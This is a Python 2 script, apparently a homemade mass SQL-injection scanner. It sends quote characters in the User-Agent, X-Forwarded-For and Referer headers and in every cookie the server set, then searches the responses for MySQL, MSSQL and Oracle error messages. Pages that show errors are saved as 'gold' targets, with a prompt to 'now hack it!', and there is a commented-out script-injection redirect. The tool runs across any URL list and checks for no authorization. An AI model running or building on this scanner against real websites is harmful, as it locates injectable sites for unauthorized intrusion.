#!/usr/bin/env python

import requests
import sys
import codecs
from optparse import OptionParser
from urlparse import urlparse 
import sqlite3 as lite
import sys
import time
import simplejson as json
import hashlib
import datetime
import re 

def cmd_options():
	parser = OptionParser()
	parser.add_option("-f", dest="filename", help="file name to read url's from", metavar="url_list.txt")
	parser.add_option("-M", dest="mode", help="set the output mode, defualt is stdout, options include ES for ElasticSearch and SQLite", metavar="mode") 
	(options, args) = parser.parse_args()
	return options.filename

def get_url():
	print "what url would you like teh Lobster to visit?"
	url = raw_input()
	return url    	

# use Requests to grab status code of url. if the remote host does not respond the function will return a status_code of 0. This is to be expected and means we could not contact the remote host. if you want to know why that is you will need to edit defaults.py of the Requests module. on to the next...'''
def check_one(url):
	headers = {'User-Agent': 'Mozilla/5.0'}
	try:
		r = requests.get(url, headers=headers, allow_redirects=False)  
		# print "we recieved a status code of:" + str(r.status_code)
		# print r.headers['set-cookie']
		return (r.status_code,r.headers['set-cookie'])
	except (requests.ConnectionError, requests.Timeout):
		status = 0
		cookie = 2
                return (status,cookie)

# finally, lets throw some malformed http headers. In the future this should be randomized to blend in. 
def attack_loop(url,c):
			attack_one(url)
			# attack_two(url)
			# attack_three(url)
			attack_four(url)
			attack_five(url)
			attack_six(url)	
			# get cookies. have pinic 
			if c != None: 
				attack_nine(url,c)

# and the attacks
def attack_one(url):
	headers = {'User-Agent': '\''}	
	at = 1
	gtg = 0
	try: 
   		a = requests.get(url, headers=headers,allow_redirects=False)
		gtg = 1
	except (requests.ConnectionError, requests.Timeout):
		attack_fail(url)  	
	if gtg == 1:
		base_attack(a,at,url)
	                      


def attack_four(url):
        headers = {'User-Agent': '\"'}
        at = 4
	gtg = 0
	try: 
   		a = requests.get(url, headers=headers,allow_redirects=False)
		gtg = 1
	except (requests.ConnectionError, requests.Timeout):
		attack_fail(url)  	
	
	if gtg == 1:
		base_attack(a,at,url)

def attack_five(url):
	headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)','X-Forwarded-For': '\''}
	at = 5
	gtg = 0
	try: 
   		a = requests.get(url, headers=headers,allow_redirects=False)
		gtg = 1
	except (requests.ConnectionError, requests.Timeout):
		attack_fail(url)  	
	
	if gtg == 1:
		base_attack(a,at,url)

def attack_six(url):
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)','Referer': '\''}
        at = 6
	gtg = 0
        try: 
   		a = requests.get(url, headers=headers,allow_redirects=False)
		gtg = 1
	except (requests.ConnectionError, requests.Timeout):
		attack_fail(url)  	
	
	if gtg == 1:
		base_attack(a,at,url)


#the cookie attack. Premise is simple, send SQLi (or other bogus cookies) back to webserver, parse the returned HTML (sql_error_check) to see if there is an error thrown from the server.
def attack_nine(url,c):	
	gtg = 0
	at = 9	
	d1 = str(c)
	#take our cookie and use regEx to split out cookie value names, will be in array: m.group(x) where x is the corresponding () below. 0 is the inital whole match, 1 is good stuff, 2 is bunk. yeah, its confusing and could proablby be done better but it works. 
	try:
		# print c
		m = re.match(r"(.*?=)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?)(.*?=|.*?)(.*?[Tue|Mon|Wed|Thu|Fri|Sat|Sun],.*?,\s*|.*?,\s*|.*?).*", d1)
	except():
		return 
	#lets make a list of all our cookie names that the server sent to us. because of my janky regEx i had to get creative on how to get the right values in the list. skip 0, grab only odd number results (m.group()) that don't contain ";". fun!
	clist =[]
	for i in range (1,15):
		if i & 1: 		
			if re.search(r".*?;",m.group(i)) == None:
				clist.append(m.group(i).rstrip('='))
	headers = {'User-Agent': 'Mozilla/5.0'}
        #lets create our cookie dict/array and add a value for each cookie/key
        cookies = {}
	for name in clist:
		cookies[name] = '\'' 
	#ok, time to send our malicious cookies back to the server. 
	try: 
   		a = requests.get(url, cookies=cookies, headers=headers, allow_redirects=False)
		gtg = 1
	except (requests.ConnectionError, requests.Timeout):
		attack_fail(url)  	
	
	if gtg == 1:
		base_attack(a,at,url)

# def attack_x(url):
#	headers = {'User-Agent': '<script>window.location = "http://xxxx"</script>'}

	
		
def sql_error_check(url, html):
	#we must check the returned html for signs of possible SQLi. Database errors of course. To do this we use regEx
	#mysql Error
	matchObj = re.search("you\shave\san\serror", html, re.M|re.I)
	#msSql Error
	matchObj2 = re.search("microsoft\sOLE\sDB\sProvider\sfor\sODBC\sDrivers\serror", html, re.M|re.I)
	#Oracle ERror
	matchObj3 = re.search(":\squoted\sstring\snot\sproperly\sterminated", html, re.M|re.I)
	if matchObj:
		db = 'mysql'
		return (True, db) 
	if matchObj2:
		db = 'mssql'
		return (True, db)	
	if matchObj3:
		db = 'oracle'
		return (True, db)
	no = None 
	return (False, no)

# push header data to ElasticSeach Index
def write_to_ES(url,status,at,params,sErr,db):
	#for hashing url
	h = hashlib.sha1()
	h.update(url)
	b = h.hexdigest()
	#grab the first character of the hased URL
	index = b[0]	
	#set date
	now = datetime.datetime.now()
	date = (str(now.year) + "-" + str(now.month) + "-" + str(now.day))
	#craft payload
	try: 
		params = {'url': {'name' : b, 'response_code' : status, 'attack' : at, 'headers' : params,'py_date' : date, 'URI' : url, 'sqlErr' : sErr, 'db2' : db}}
		#format payload to json
		data_json = json.dumps(params)	
		# print params	
		theSpot = ("http://localhost:9200/" + index + "/url/")
		a = requests.post(theSpot, data = data_json)
		# print a.status_code
		# print a.text
	except:
		print "JSON error caught" 
		print url

def base_attack(a,at,url):
	sErr = None
	db = None
	# print a.headers['content-type']
	params = a.headers
        #lets try to make sure its not a binary file of some sort
	if a.headers['content-type'] != 'image/gif' and a.headers['content-type'] != 'image/png' and a.headers['content-type'] != 'image/jpg' and a.headers['content-type'] != 'application/pdf' and a.headers['content-type'] != 'image/jpeg':
        	try:
			if a.text != None:
        	        	sErr, db = sql_error_check(url, a.text)
                except():        	
			print a.headers['content-type']
			print "can't be written as text" 
		# ES is currently turned off, will re-emerge with command line switch and information on how to configure ES to take your data
		# write_to_ES(url,a.status_code,at,params,sErr,db)
                verbose(a,at,url,sErr)
		if sErr == True:
                	write_error_html(url, a.text, at)

def verbose(a,at,url, sErr):
	# print a.status_code
	if sErr == True:
        	print "Attack Number:", at, " ", bcolors.FAIL + "Succeeded! Error Detected.(now hack it!)" + bcolors.ENDC

	else:
                print "Attack Number:", at, " ", "Failed, no error detected."
		

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

    def disable(self):
        self.HEADER = ''
        self.OKBLUE = ''
        self.OKGREEN = ''
        self.WARNING = ''
        self.FAIL = ''
        self.ENDC = ''


#File Write Defs
#Check_one returned "0". Could be that URL is down, could be static of the internets. 
def bad_url(url):
	f = open('bad_url.log','a')
	f.writelines(url + "\n")
	f.close()

def attack_fail(url):
	f = open('attackFail.log','a')
	f.writelines(url + "\n")
	f.close()

def error_500(url):
	f = open('error_500.log','a')
	f.writelines(url + '\n')
	f.close()

def write_logfile(count,url,logfile):
	f = open(str(logfile),'a')
	f.writelines(count + "  " + url+ '\n')
	f.close

def check_1_fail(url):
	f = open('write_fail.log','a')
	f.writelines(url + '\n')
	f.close()

# here we save off the HTML in which an error code has been detected
def write_error_html(url, html, at):
	prefix = 'http://' 
	if url.startswith(prefix): 
		url = url[len(prefix):] 
	html = html.encode('ascii', 'replace')
	fname = ("./gold/" + url + '_' + str(at))
	f = open(fname,'w+')
	f.write(html + '\n')
	f.close

#here we go
def begin(url):
	
	statusCode, cookie = check_one(url)	
	
	if statusCode == 0:
		bad_url(url)
	
	elif statusCode == 500:
			error_500(url)
	
	else:
		attack_loop(url,cookie)
    
#main yo
def main():
	filename = cmd_options() 
	
	if filename == None: # then a list was not specfied
		url = get_url() # request user input, return status code		
		begin(url) #research 

	else:# grab the list and get busy
		logfile = filename + "_log"
		f = codecs.open(filename,'r',"utf-8-sig")
		count = 0
		for line in f:
			url = str(line).strip()	
			write_logfile(str(count),url,logfile)
			# url = urlparse(url)
			# url = url.get_url()					
			if url != "": 
				begin(url) #research 
				count = count + 1
		f.close()

# Ready Begin
if __name__ == "__main__":
	main()

    

	
